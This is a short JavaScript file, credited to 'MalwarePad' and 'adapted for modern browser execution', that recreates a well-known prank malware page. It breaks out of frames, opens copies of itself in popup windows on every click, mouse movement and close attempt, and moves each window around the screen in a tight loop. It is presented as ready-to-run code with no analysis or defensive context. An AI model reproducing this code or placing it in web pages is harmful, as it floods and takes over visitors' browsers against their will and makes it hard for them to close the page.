/* * Original Logic by MalwarePad 
    * Adapted for modern browser execution
*/

if (top.location != location) {
    top.location.href = location.href;
}

function reopen() {
    // We use window.location.href so it opens another copy of this same page
    window.open(
        window.location.href,
        "win" + Math.random(),
        "menubar=no,status=no,toolbar=no,resizable=no,width=350,height=370,titlebar=no,alwaysRaised=yes"
    );
}

function spam() {
    for (var i = 0; i < 6; i++) { // Browsers block 10+, 6 is safer
        reopen();
    }
}

function init() {
    // Attach the "Idiot" behavior to everything
    document.body.onclick = reopen;
    document.body.onmouseover = reopen;
    document.body.onmousemove = reopen;
    
    // Attempt to spawn on close (Modern browsers often block this)
    window.onunload = spam;
    window.onbeforeunload = spam;

    playBall();

    // Spawn the first popup immediately
    reopen();
    
    // Close the original window after 10 seconds if it's a popup
    if (window.opener) {
        setTimeout(function () {
            window.close();
        }, 10000);
    }
}

var xOff = 5, yOff = 5, xPos = 400, yPos = -100, flagRun = true;

function newXlt() { xOff = Math.ceil(0 - 6 * Math.random()) * 5 - 10; window.focus(); }
function newXrt() { xOff = Math.ceil(7 * Math.random()) * 5 - 10; }
function newYup() { yOff = Math.ceil(0 - 6 * Math.random()) * 5 - 10; }
function newYdn() { yOff = Math.ceil(7 * Math.random()) * 5 - 10; }

function playBall() {
    xPos += xOff;
    yPos += yOff;

    if (xPos > screen.width - 350) newXlt();
    if (xPos < 0) newXrt();
    if (yPos > screen.height - 370) newYup();
    if (yPos < 0) newYdn();

    if (flagRun) {
        // This moves the actual browser window
        window.moveTo(xPos, yPos);
        setTimeout(playBall, 1);
    }
}
